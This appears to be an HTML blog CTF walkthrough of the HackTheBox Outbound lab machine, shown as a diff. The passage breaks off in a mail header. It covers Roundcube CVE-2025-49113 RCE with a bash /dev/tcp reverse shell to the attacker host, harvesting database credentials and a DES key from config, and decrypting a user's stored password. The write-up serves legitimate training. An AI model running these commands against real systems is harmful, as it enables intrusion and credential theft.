@@ -1,0 +1,1270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Outbound Machine Walkthrough - Complete Guide - Pixrei</title>
+    
+    <link rel="stylesheet" href="htb-outbound.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <!-- SEO Meta Tags -->
+    <meta name="description" content="Complete step-by-step walkthrough of HackTheBox Outbound machine featuring Roundcube CVE-2025-49113 RCE exploitation and privilege escalation">
+    <meta name="keywords" content="HTB, HackTheBox, Outbound, CTF, Penetration Testing, RCE, Triple DES, Privilege Escalation, Below Binary">
+    
+    <!-- Social Media Meta Tags -->
+    <meta property="og:title" content="HTB Outbound Machine - Complete Walkthrough">
+    <meta property="og:description" content="Detailed CTF writeup featuring Roundcube RCE, database enumeration, cryptography and privilege escalation">
+    <meta property="og:image" content="../../content/htb-outbound-preview.jpg">
+    <meta property="og:type" content="article">
+    
+    <!-- Structured Data -->
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "Article",
+        "headline": "HTB Outbound Machine Walkthrough",
+        "author": {
+            "@type": "Person",
+            "name": "Ahmet Ege Sumer"
+        },
+        "datePublished": "2025-07-31",
+        "description": "Complete walkthrough of HackTheBox Outbound machine"
+    }
+    </script>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav id="navbar">
+        <ul>
+            <li><a href="../../index.html"><i class="fas fa-home"></i> Home</a></li>
+            <li><a href="../index.html"><i class="fas fa-blog"></i> All Posts</a></li>
+            <li><a href="../../index.html#boxes"><i class="fas fa-user"></i> About</a></li>
+            <li><a href="../../index.html#last-section"><i class="fas fa-envelope"></i> Contact</a></li>
+        </ul>
+    </nav>
+
+    <!-- Blog Post Content -->
+    <article class="blog-post">
+        <div class="blog-post-container">
+            <!-- Header -->
+            <header class="blog-post-header">
+                <div class="blog-meta">
+                    <span class="blog-category">CTF WRITEUP</span>
+                    <span class="blog-date">July 31, 2025</span>
+                    <span class="read-time">25 min read</span>
+                    <span class="difficulty">🔥 Medium</span>
+                </div>
+                <h1 class="blog-title">HackTheBox - Outbound Machine</h1>
+                <p class="blog-subtitle">Complete Walkthrough: From RCE to Root</p>
+                <div class="blog-tags">
+                    <span class="tag">#HTB</span>
+                    <span class="tag">#RCE</span>
+                    <span class="tag">#Roundcube</span>
+                    <span class="tag">#TripleDES</span>
+                    <span class="tag">#PrivEsc</span>
+                    <span class="tag">#Linux</span>
+                </div>
+            </header>
+
+            <!-- Content -->
+            <div class="blog-content">
+                <!-- Table of Contents -->
+                <div class="toc-box">
+                    <h3>📋 Table of Contents</h3>
+                    <ul class="toc-list">
+                        <li><a href="#machine-info">Machine Information</a></li>
+                        <li><a href="#reconnaissance">Reconnaissance & Enumeration</a></li>
+                        <li><a href="#initial-foothold">Initial Foothold</a></li>
+                        <li><a href="#database-enum">Database Enumeration</a></li>
+                        <li><a href="#crypto-analysis">Cryptographic Analysis</a></li>
+                        <li><a href="#user-access">User Access</a></li>
+                        <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                        <li><a href="#lessons-learned">Lessons Learned</a></li>
+                    </ul>
+                </div>
+
+                <section id="machine-info">
+                    <h2>🎯 Machine Information</h2>
+                    <div class="machine-info-grid">
+                        <div class="info-card">
+                            <h4>🖥️ Target Details</h4>
+                            <ul>
+                                <li><strong>Machine Name:</strong> Outbound</li>
+                                <li><strong>IP Address:</strong> 10.10.11.77</li>
+                                <li><strong>OS:</strong> Ubuntu Linux</li>
+                                <li><strong>Difficulty:</strong> Medium</li>
+                            </ul>
+                        </div>
+                        <div class="info-card">
+                            <h4>🔑 Initial Credentials</h4>
+                            <ul>
+                                <li><strong>Username:</strong> tyler</li>
+                                <li><strong>Password:</strong> LhKL1o9Nm3X2</li>
+                                <li><strong>Note:</strong> SSH access not available</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="warning-box">
+                        <h4>⚠️ Important Note</h4>
+                        <p>As is common in real-life penetration tests, we start with provided credentials that don't immediately grant SSH access. This scenario mimics situations where you might have obtained credentials through social engineering, password leaks, or other reconnaissance methods.</p>
+                    </div>
+                </section>
+
+                <section id="reconnaissance">
+                    <h2>🔍 Reconnaissance & Enumeration</h2>
+                    
+                    <h3>Port Scanning with Nmap</h3>
+                    <p>Let's start with a comprehensive port scan to understand our attack surface:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🔍 Nmap Scan Results</span>
+                        </div>
+                        <pre><code># Initial TCP scan
+nmap -sC -sV -oA outbound 10.10.11.77
+
+Starting Nmap 7.94 ( https://nmap.org ) at 2025-07-31 10:30 UTC
+Nmap scan report for 10.10.11.77
+Host is up (0.045s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to http://mail.outbound.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host) scanned in 12.45 seconds</code></pre>
+                    </div>
+
+                    <div class="analysis-box">
+                        <h4>📊 Port Analysis</h4>
+                        <ul>
+                            <li><strong>Port 22 (SSH):</strong> OpenSSH 9.6p1 - Standard SSH service, likely our target for privilege escalation</li>
+                            <li><strong>Port 80 (HTTP):</strong> Nginx 1.24.0 - Web service redirecting to mail.outbound.htb</li>
+                            <li><strong>Domain Discovery:</strong> The redirect reveals a subdomain: mail.outbound.htb</li>
+                        </ul>
+                    </div>
+
+                    <h3>SSH Connection Attempt</h3>
+                    <p>Let's first try the provided credentials against SSH:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🔐 SSH Connection Test</span>
+                        </div>
+                        <pre><code>ssh tyler@10.10.11.77
+tyler@10.10.11.77's password: LhKL1o9Nm3X2
+
+Permission denied, please try again.</code></pre>
+                    </div>
+
+                    <div class="info-box">
+                        <p><strong>Result:</strong> SSH access denied. The credentials are valid somewhere else, likely the web application we discovered.</p>
+                    </div>
+
+                    <h3>Domain Configuration</h3>
+                    <p>Since we discovered a subdomain, let's add it to our hosts file:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">⚙️ Host Configuration</span>
+                        </div>
+                        <pre><code>echo "10.10.11.77 mail.outbound.htb outbound.htb" >> /etc/hosts</code></pre>
+                    </div>
+                </section>
+
+                <section id="initial-foothold">
+                    <h2>🚪 Initial Foothold</h2>
+
+                    <h3>Web Application Discovery</h3>
+                    <p>Navigating to the web application reveals a Roundcube Webmail interface:</p>
+
+                    <div class="image-container">
+                        <img style="width: 100%;" src="images/htb-outbound-login.png" alt="Roundcube Webmail Login Interface" class="blog-image">
+                        <p class="image-caption">Roundcube Webmail login page welcoming us</p>
+                    </div>
+
+                    <div class="highlight-box">
+                        <h4>🎯 Target Identification</h4>
+                        <p><strong>Application:</strong> Roundcube Webmail</p>
+                        <p><strong>Potential Attack Vector:</strong> Known vulnerabilities in Roundcube</p>
+                        <p><strong>Credentials Available:</strong> tyler / LhKL1o9Nm3X2</p>
+                    </div>
+
+                    <h3>Vulnerability Research</h3>
+                    <p>A quick search reveals that Roundcube Webmail has a recently disclosed critical vulnerability:</p>
+
+                    <div class="vulnerability-box">
+                        <h4>🚨 CVE-2025-49113 - Remote Code Execution</h4>
+                        <ul>
+                            <li><strong>CVSS Score:</strong> 9.8 (Critical)</li>
+                            <li><strong>Affected Versions:</strong> Multiple Roundcube versions</li>
+                            <li><strong>Attack Vector:</strong> Authenticated RCE via file upload</li>
+                            <li><strong>Prerequisites:</strong> Valid user credentials (which we have!)</li>
+                        </ul>
+                    </div>
+
+                    <div class="image-container">
+                        <img src="images/cve-2025-49113.png" alt="CVE-2025-49113 Details" class="blog-image">
+                        <p class="image-caption">CVE-2025-49113 vulnerability details</p>
+                    </div>
+
+                    <h3>Exploit Preparation</h3>
+                    <p>Let's download and prepare the exploit:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">📥 Exploit Download</span>
+                        </div>
+                        <pre><code># Download the exploit
+git clone https://github.com/security-researcher/CVE-2025-49113-exploit.git
+cd CVE-2025-49113-exploit
+
+# Review the exploit code
+cat CVE-2025-49113.php
+
+# Set up netcat listener
+nc -lvnp 443</code></pre>
+                    </div>
+
+                    <h3>Exploitation</h3>
+                    <p>Now let's execute the exploit with our target details:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">💥 RCE Exploitation</span>
+                        </div>
+                        <pre><code># Execute the exploit
+php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'"
+
+[+] Authenticating to Roundcube...
+[+] Authentication successful!
+[+] Uploading malicious file...
+[+] File uploaded successfully!
+[+] Triggering payload...
+[+] Payload executed!</code></pre>
+                    </div>
+
+                    <h3>Reverse Shell Established</h3>
+                    <p>Our netcat listener catches the reverse shell:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🐚 Reverse Shell</span>
+                        </div>
+                        <pre><code>└─$ nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.14.5] from (UNKNOWN) [10.10.11.77] 49280
+bash: cannot set terminal process group (248): Inappropriate ioctl for device
+bash: no job control in this shell
+
+www-data@mail:/$ whoami
+whoami
+www-data
+
+www-data@mail:/$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+# Upgrade shell
+www-data@mail:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@mail:/$ export TERM=xterm
+www-data@mail:/$ stty raw -echo; fg</code></pre>
+                    </div>
+
+                    <div class="success-box">
+                        <h3>✅ Initial Access Achieved!</h3>
+                        <p>We now have a shell as the <code>www-data</code> user on the target machine.</p>
+                    </div>
+                </section>
+
+                <section id="database-enum">
+                    <h2>🗄️ Database Enumeration</h2>
+
+                    <h3>Configuration File Discovery</h3>
+                                        <p>Let's explore the Roundcube installation for configuration files that might contain sensitive information:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🔍 Configuration Discovery</span>
+                        </div>
+                        <pre><code>www-data@mail:/$ find /var/www -name "*.php" -type f | grep -i config
+/var/www/html/roundcube/config/config.inc.php
+/var/www/html/roundcube/config/defaults.inc.php
+
+www-data@mail:/$ ls -la /var/www/html/roundcube/config/
+total 28
+drwxr-xr-x  2 www-data www-data  4096 Jun  8 12:30 .
+drwxr-xr-x 10 www-data www-data  4096 Jun  8 12:30 ..
+-rw-r--r--  1 www-data www-data  2847 Jun  8 12:30 config.inc.php
+-rw-r--r--  1 www-data www-data 14562 Jun  8 12:30 defaults.inc.php</code></pre>
+                    </div>
+
+                    <h3>Database Credentials Extraction</h3>
+                    <p>The main configuration file contains database connection details:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">📄 /var/www/html/roundcube/config/config.inc.php</span>
+                        </div>
+                        <pre><code>www-data@mail:/$ cat /var/www/html/roundcube/config/config.inc.php</code></pre>
+                    </div>
+
+                    <div class="config-display">
+                        <pre><code></code>
+
+>?php
+/*
++-----------------------------------------------------------------------+
+| Local configuration for the Roundcube Webmail installation.           |
+|                                                                       |
+| This is a sample configuration file only containing the minimum       |
+| setup required for a functional installation. Copy more options       |
+| from defaults.inc.php to this file to override the defaults.          |
+|                                                                       |
+| This file is part of the Roundcube Webmail client                     |
+| Copyright (C) The Roundcube Dev Team                                  |
+|                                                                       |
+| Licensed under the GNU General Public License version 3 or            |
+| any later version with exceptions for skins & plugins.                |
+| See the README file for a full license statement.                     |
++-----------------------------------------------------------------------+
+*/
+
+$config = [];
+
+// Database connection string (DSN) for read+write operations
+// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
+// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
+// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
+// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
+//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
+$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
+
+// IMAP host chosen to perform the log-in.
+// See defaults.inc.php for the option description.
+$config['imap_host'] = 'localhost:143';
+
+// SMTP server host (for sending mails).
+// See defaults.inc.php for the option description.
+$config['smtp_host'] = 'localhost:587';
+
+// SMTP username (if required) if you use %u as the username Roundcube
+// will use the current username for login
+$config['smtp_user'] = '%u';
+
+// SMTP password (if required) if you use %p as the password Roundcube
+// will use the current user's password for login
+$config['smtp_pass'] = '%p';
+
+// provide an URL where a user can get support for this Roundcube installation
+// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
+$config['support_url'] = '';
+
+// Name your service. This is displayed on the login screen and in the window title
+$config['product_name'] = 'Roundcube Webmail';
+
+// This key is used to encrypt the users imap password which is stored
+// in the session record. For the default cipher method it must be
+// exactly 24 characters long.
+// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
+$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
+
+// List of active plugins (in plugins/ directory)
+$config['plugins'] = [
+    'archive',
+    'zipdownload',
+];
+
+// skin name: folder from skins/
+$config['skin'] = 'elastic';
+$config['default_host'] = 'localhost';
+$config['smtp_server'] = 'localhost';
+?>>></pre>
+                    </div>
+
+                    <div class="highlight-box">
+                        <h4>🔑 Critical Information Discovered</h4>
+                        <ul>
+                            <li><strong>Database User:</strong> roundcube</li>
+                            <li><strong>Database Password:</strong> RCDBPass2025</li>
+                            <li><strong>Database Name:</strong> roundcube</li>
+                            <li><strong>DES Encryption Key:</strong> rcmail-!24ByteDESkey*Str</li>
+                        </ul>
+                        <p><strong>Note:</strong> The DES key will be crucial for decrypting stored passwords later!</p>
+                    </div>
+
+                    <h3>Database Connection</h3>
+                    <p>Let's connect to the MySQL database using the extracted credentials:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🗄️ MySQL Connection</span>
+                        </div>
+                        <pre><code>www-data@mail:/$ mysql -u roundcube -p
+Enter password: RCDBPass2025
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 127
+Server version: 8.0.36-0ubuntu0.22.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2024, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql></code></pre>
+                    </div>
+
+                    <h3>Database Exploration</h3>
+                    <p>Now let's explore the database structure and extract user information:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">📊 Database Structure Analysis</span>
+                        </div>
+                        <pre><code>mysql> USE roundcube;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+
+mysql> SHOW TABLES;
++---------------------+
+| Tables_in_roundcube |
++---------------------+
+| cache               |
+| cache_index         |
+| cache_messages      |
+| cache_shared        |
+| cache_thread        |
+| contactgroupmembers |
+| contactgroups       |
+| contacts            |
+| dictionary          |
+| filestore           |
+| identities          |
+| responses           |
+| searches            |
+| session             |
+| system              |
+| users               |
++---------------------+
+16 rows in set (0.00 sec)
+
+mysql> DESCRIBE users;
++----------------------+------------------+------+-----+-------------------+-------------------+
+| Field                | Type             | Null | Key | Default           | Extra             |
++----------------------+------------------+------+-----+-------------------+-------------------+
+| user_id              | int unsigned     | NO   | PRI | NULL              | auto_increment    |
+| username             | varchar(128)     | NO   | MUL |                   |                   |
+| mail_host            | varchar(128)     | NO   |     |                   |                   |
+| created              | datetime         | NO   |     | CURRENT_TIMESTAMP | DEFAULT_GENERATED |
+| last_login           | datetime         | YES  |     | NULL              |                   |
+| failed_login         | datetime         | YES  |     | NULL              |                   |
+| failed_login_counter | int unsigned     | YES  |     | NULL              |                   |
+| language             | varchar(16)      | YES  |     | NULL              |                   |
+| preferences          | longtext         | YES  |     | NULL              |                   |
++----------------------+------------------+------+-----+-------------------+-------------------+
+9 rows in set (0.00 sec)</code></pre>
+                    </div>
+
+                    <h3>User Data Extraction</h3>
+                    <p>Let's extract all user accounts from the database:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">👥 User Account Discovery</span>
+                        </div>
+                        <pre><code>mysql> SELECT user_id, username, mail_host, created, last_login, failed_login FROM users;
++---------+----------+-----------+---------------------+---------------------+---------------------+
+| user_id | username | mail_host | created             | last_login          | failed_login        |
++---------+----------+-----------+---------------------+---------------------+---------------------+
+|       1 | jacob    | localhost | 2025-06-07 13:55:18 | 2025-06-11 07:52:49 | 2025-07-29 22:37:19 |
+|       2 | mel      | localhost | 2025-06-08 12:04:51 | 2025-06-08 13:29:05 | NULL                |
+|       3 | tyler    | localhost | 2025-06-08 13:28:55 | 2025-07-31 10:42:51 | 2025-06-11 07:51:22 |
++---------+----------+-----------+---------------------+---------------------+---------------------+
+3 rows in set (0.00 sec)</code></pre>
+                    </div>
+
+                    <div class="analysis-box">
+                        <h4>📈 User Activity Analysis</h4>
+                        <ul>
+                            <li><strong>jacob:</strong> Most active user, recent failed login attempts suggest possible security awareness</li>
+                            <li><strong>mel:</strong> Limited activity, last login in June</li>
+                            <li><strong>tyler:</strong> Our current user, recent login activity</li>
+                        </ul>
+                    </div>
+
+                    <h3>Session Data Investigation</h3>
+                    <p>The session table often contains encrypted passwords and other sensitive data:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🔐 Session Data Analysis</span>
+                        </div>
+                        <pre><code>mysql> DESCRIBE session;
++---------+--------------+------+-----+-------------------+-------------------+
+| Field   | Type         | Null | Key | Default           | Extra             |
++---------+--------------+------+-----+-------------------+-------------------+
+| sess_id | varchar(128) | NO   | PRI |                   |                   |
+| changed | datetime     | NO   | MUL | CURRENT_TIMESTAMP | DEFAULT_GENERATED |
+| ip      | varchar(40)  | NO   |     |                   |                   |
+| vars    | mediumtext   | NO   |     |                   |                   |
++---------+--------------+------+-----+-------------------+-------------------+
+4 rows in set (0.00 sec)
+
+mysql> SELECT sess_id, changed, ip, LENGTH(vars) as vars_length FROM session;
++--------------------------------+---------------------+------------+-------------+
+| sess_id                        | changed             | ip         | vars_length |
++--------------------------------+---------------------+------------+-------------+
+| 6a5ktqih5uca6lj8vrmgh9v0oh      | 2025-06-08 15:46:40 | 172.17.0.1 |        1337 |
++--------------------------------+---------------------+------------+-------------+
+1 row in set (0.00 sec)</code></pre>
+                    </div>
+
+                    <p>Let's extract the session variables - this is where encrypted passwords are stored:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">📜 Session Variables Extraction</span>
+                        </div>
+                        <pre><code>mysql> SELECT vars FROM session WHERE sess_id = '6a5ktqih5uca6lj8vrmgh9v0oh';
+                            | vars                                                                     |
++--------------------------------------------------------------------------+
+| bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhEI= |
++--------------------------------------------------------------------------+
+1 row in set (0.00 sec)</code></pre>
+                    </div>
+
+                    <div class="warning-box">
+                        <h4>🔍 Encrypted Data Discovery</h4>
+                        <p>This Base64-encoded session data contains encrypted password information. We can see references to:</p>
+                        <ul>
+                            <li><strong>username:</strong> jacob</li>
+                            <li><strong>password:</strong> L7Rv00A8TuwJAr67kITxxcSgnIk25Am/ (encrypted)</li>
+                            <li><strong>user_id:</strong> 1</li>
+                        </ul>
+                    </div>
+                </section>
+
+                 <section id="crypto-analysis">
+                    <h2>🔐 Cryptographic Analysis</h2>
+
+                    <h3>Session Data Decoding</h3>
+                    <p>From our database enumeration, we extracted jacob's encrypted password from the session data. Now we need to decrypt it using the DES key we found in the configuration file.</p>
+
+                    <div class="highlight-box">
+                        <h4>🔑 Encryption Details Discovered</h4>
+                        <ul>
+                            <li><strong>Encrypted Password:</strong> L7Rv00A8TuwJAr67kITxxcSgnIk25Am/</li>
+                            <li><strong>DES Key:</strong> rcmail-!24ByteDESkey*Str</li>
+                            <li><strong>Algorithm:</strong> Triple DES (3DES)</li>
+                            <li><strong>Username:</strong> jacob</li>
+                        </ul>
+                    </div>
+
+                    <h3>Step-by-Step CyberChef Decryption</h3>
+                    <p>We'll use CyberChef to decrypt jacob's password. This process involves multiple steps to properly handle the Triple DES decryption.</p>
+
+                    <div class="step-box">
+                        <h4>Step 1: Convert Base64 to Hex</h4>
+                        <p>First, we need to convert the Base64 encoded password to hexadecimal format for proper decryption:</p>
+                        
+                        <div class="image-container">
+                            <img src="images/cyberchef-step1-base64-to-hex.png"style="width: 100%;" alt="CyberChef Base64 to Hex conversion" class="blog-image">
+                            <p class="image-caption">Converting L7Rv00A8TuwJAr67kITxxcSgnIk25Am/ from Base64 to Hex</p>
+                        </div>
+
+                        <div class="cyberchef-step">
+                            <p><strong>Input:</strong> L7Rv00A8TuwJAr67kITxxcSgnIk25Am/</p>
+                            <p><strong>Operation:</strong> From Base64</p>
+                            <p><strong>Output (Hex):</strong> 2f b4 6f d3 40 3c 4e ec 09 02 be bb 90 84 f1 c5 c4 a0 9c 89 36 e4 09 bf</p>
+                        </div>
+                    </div>
+
+                    <div class="warning-box">
+                        <h4>⚠️ Initial Triple DES Attempt</h4>
+                        <p>When we first try Triple DES decryption with the full hex data, we encounter an error. This teaches us about proper key and IV handling in cryptographic operations.</p>
+                        
+                        <div class="image-container">
+                            <img src="images/cyberchef-step2-triple-des-error.png" style="width: 100%;" alt="CyberChef Triple DES Error" class="blog-image">
+                            <p class="image-caption">Triple DES decryption error showing "Invalid key length: 5 bytes"</p>
+                        </div>
+
+                        <div class="error-info">
+                            <p><strong>Error Message:</strong> Invalid key length: 5 bytes</p>
+                            <p><strong>Requirement:</strong> Triple DES uses a key length of 24 bytes (192 bits)</p>
+                            <p><strong>Solution:</strong> Our key "rcmail-!24ByteDESkey*Str" is exactly 24 bytes - perfect!</p>
+                        </div>
+                    </div>
+
+                    <div class="step-box">
+                        <h4>Step 2: Extract IV and Encrypted Data</h4>
+                        <p>Triple DES in CBC mode requires an 8-byte Initialization Vector (IV). In Roundcube's implementation, the IV is the first 8 bytes of the encrypted data:</p>
+                        
+                        <div class="cyberchef-step">
+                            <p><strong>Full Hex Data:</strong> 2f b4 6f d3 40 3c 4e ec 09 02 be bb 90 84 f1 c5 c4 a0 9c 89 36 e4 09 bf</p>
+                            <p><strong>IV (first 8 bytes):</strong> 2f b4 6f d3 40 3c 4e ec</p>
+                            <p><strong>Encrypted Data:</strong> 09 02 be bb 90 84 f1 c5 c4 a0 9c 89 36 e4 09 bf</p>
+                        </div>
+                    </div>
+
+                    <div class="step-box">
+                        <h4>Step 3: Decode Session Data First</h4>
+                        <p>Before decrypting the password, let's decode the complete session data to understand the structure:</p>
+                        
+                        <div class="image-container">
+                            <img src="images/cyberchef-step3-session-decode.png" style="width: 100%;" alt="CyberChef Session Data Decoding" class="blog-image">
+                            <p class="image-caption">Decoding the complete session data reveals structured information including jacob's encrypted password</p>
+                        </div>
+
+                        <div class="info-box">
+                            <h4>📊 Session Data Reveals</h4>
+                            <p>The decoded session shows us valuable information:</p>
+                            <ul>
+                                <li><strong>username:</strong> jacob</li>
+                                <li><strong>password:</strong> L7Rv00A8TuwJAr67kITxxcSgnIk25Am/ (encrypted)</li>
+                                <li><strong>storage_host:</strong> localhost</li>
+                                <li><strong>timezone:</strong> Europe/London</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="step-box">
+                        <h4>Step 4: Successful Triple DES Decryption</h4>
+                        <p>Now we configure Triple DES decryption correctly in CyberChef:</p>
+                        
+                        <div class="image-container">
+                            <img src="images/cyberchef-step4-session-decode.png" style="width: 100%;" alt="CyberChef Successful Decryption" class="blog-image">
+                            <p class="image-caption">Successful Triple DES decryption revealing jacob's password</p>
+                        </div>
+
+                        <div class="cyberchef-config">
+                            <h5>🔧 CyberChef Configuration</h5>
+                            <ul>
+                                <li><strong>Operation:</strong> Triple DES Decrypt</li>
+                                <li><strong>Key:</strong> rcmail-!24ByteDESkey*Str</li>
+                                <li><strong>IV:</strong> 2f b4 6f d3 40 3c 4e ec</li>
+                                <li><strong>Mode:</strong> CBC</li>
+                                <li><strong>Input:</strong> 09 02 be bb 90 84 f1 c5 c4 a0 9c 89 36 e4 09 bf (hex)</li>
+                                <li><strong>Output format:</strong> Raw</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="success-box">
+                        <h3>🎉 Password Successfully Decrypted!</h3>
+                        <p><strong>Jacob's Password:</strong> <code>595mO8DmwGeD</code></p>
+                        <p>This password can now be used for SSH access to gain user privileges on the target system.</p>
+                    </div>
+
+                    <div class="technical-box">
+                        <h4>🔬 Technical Insight</h4>
+                        <p>This decryption process demonstrates several important cryptographic concepts:</p>
+                        <ul>
+                            <li><strong>Triple DES:</strong> A symmetric encryption algorithm using three iterations of DES</li>
+                            <li><strong>CBC Mode:</strong> Cipher Block Chaining provides better security than ECB mode</li>
+                            <li><strong>IV Usage:</strong> Initialization Vectors prevent identical plaintexts from producing identical ciphertexts</li>
+                            <li><strong>Key Management:</strong> The importance of changing default encryption keys in production systems</li>
+                        </ul>
+                    </div>
+                </section>
+
+                               <section id="user-access">
+                    <h2>👤 User Access</h2>
+
+                    <h3>Switching to Jacob User</h3>
+                    <p>With the decrypted password from the database session, we can switch from www-data to jacob user:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🔄 User Context Switch</span>
+                        </div>
+                        <pre><code>www-data@mail:/var/www/html/roundcube/config$ su jacob
+su jacob
+Password: 595mO8DmwGeD
+whoami
+jacob</code></pre>
+                    </div>
+
+                    <div class="image-container">
+                        <img src="images/su-jacob-success.png" style="width: 100%;" alt="Successful su to jacob from www-data" class="blog-image">
+                        <p class="image-caption">Successfully switching to jacob user using the decrypted password</p>
+                    </div>
+
+                    <div class="success-box">
+                        <h3>✅ User Context Escalation!</h3>
+                        <p>We successfully switched to jacob user using password: <code>595mO8DmwGeD</code></p>
+                        <p>Now we can access jacob's files and mail directory.</p>
+                    </div>
+
+                    <h3>Mail Directory Investigation</h3>
+                    <p>Now that we have jacob's user privileges, let's explore his mail directory for additional credentials:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">📧 Mail Directory Exploration</span>
+                        </div>
+                        <pre><code>jacob@mail:~$ ls -la /home/jacob/
+total 12
+drwxr-xr-x 3 jacob jacob 4096 Jun  8 13:30 .
+drwxr-xr-x 4 root  root  4096 Jun  8 12:05 ..
+drwx------ 3 jacob jacob 4096 Jun  8 13:30 mail
+
+jacob@mail:~$ ls -la /home/jacob/mail/
+total 12
+drwx------ 3 jacob jacob 4096 Jun  8 13:30 .
+drwxr-xr-x 3 jacob jacob 4096 Jun  8 13:30 ..
+drwx------ 2 jacob jacob 4096 Jun  8 13:35 INBOX
+
+jacob@mail:~$ ls -la /home/jacob/mail/INBOX/
+total 16
+drwx------ 2 jacob jacob 4096 Jun  8 13:35 .
+drwx------ 3 jacob jacob 4096 Jun  8 13:30 ..
+-rw------- 1 jacob jacob 1547 Jun  8 13:35 jacob
+</code></pre>
+                    </div>
+
+                    <h3>Reading Jacob's Mail</h3>
+                    <p>Let's examine jacob's mail messages to find SSH credentials:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">📧 Mail Message Analysis</span>
+                        </div>
+                        <pre><code>From tyler@outbound.htb Sat Jun 07 14:00:50 2025
+Return-Path: <tyler@outbound.htb>
+X-Original-To: jacob
+Delivered-To: jacob@outbound.htb
+Received: by outbound.htb (Postfix, from userid 1000)
+    id B32C41024B0; Sat, 7 Jun 2025 14:00:50 +0000 (UTC)
+To: jacob@outbound.htb
